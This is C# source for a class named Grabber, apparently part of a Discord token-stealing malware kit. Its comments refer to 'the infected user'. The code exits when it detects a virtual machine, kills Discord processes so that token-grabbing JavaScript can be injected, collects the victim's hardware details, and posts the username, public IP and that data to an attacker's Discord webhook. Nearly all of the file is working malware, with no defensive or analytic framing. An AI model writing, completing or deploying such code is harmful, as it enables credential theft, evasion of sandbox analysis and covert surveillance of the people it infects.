using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Linq;

namespace Furious
{
	/// <summary>
	/// Class with utilities for grabbing user information.
	/// </summary>
	public class Grabber
	{
		///This method allows the user to choose to customise the grabber, whether they want to inject the token grabbing code, get the infected user's hardware information, and choose to check for a virtual machine.
		public static async Task QuickStart(bool injectJS = false, bool getUserHardware = false, bool checkForVM = false)
		{
			if (checkForVM)
			{ 
				if (await UsingVM())
					Environment.Exit(0);
			}
			if (injectJS)
				await CloseProcesses();
			if (getUserHardware)
				await SendData(await GetHardware());
		}

		///Closes all processes which contain "discord" in their name before writing the JS.
		internal static async Task CloseProcesses()
		{
			Process.GetProcesses().Where(p => p.ProcessName.Contains("discord")).ToList().ForEach(y => y.Kill());

			await FileManagement.InjectJS();
        	}

		///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
		internal static async Task<string> GetHardware()
		{
			StringBuilder sb = new StringBuilder();

			await Task.Run(() =>
			{
				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_Processor").Get())
				{
					sb.AppendLine($"CPU: {obj["Name"]}");
				}
				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_VideoController").Get())
				{
					sb.AppendLine($"GPU: {obj["Name"]}");
				}
				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
                		{
					sb.AppendLine($"OS: {obj["Caption"]}");
                		}
			});

			Console.WriteLine(sb.ToString());
			return sb.ToString();
		}

		///This method sends the data the paramater holds to a specified Discord webhook.
		internal static async Task<HttpResponseMessage> SendData(string data, HttpResponseMessage response = null)
		{
			string hook = "webhook-here";
			
			using (HttpClient httpClient = new HttpClient())
			{
				try
				{
					Dictionary<string, string> contents = new Dictionary<string, string>
					{
						{ "content", $"Data for '{ Environment.UserName }' @ { await GrabIP() }	```{ data }```" }
					};

                    			response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
				}
				catch (HttpRequestException ex)
				{
					Console.WriteLine(ex.Message);
				}
			}

			///This inherited method obtains the users IP address which will be sent to the specified webhook.
			async Task<string> GrabIP() => await new WebClient().DownloadStringTaskAsync("https://ipv4.icanhazip.com");

			return response;
		}

		internal static Task<bool> UsingVM()
		{
			///If the process is running within a Virtual Machine, the process will close before executing code.
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
						{
							Console.WriteLine("Using VM: true");
							return Task.FromResult(true);
						}
					}
				}
			}
			Console.WriteLine("Using VM: false");
			return Task.FromResult(false);
		}
	}
}
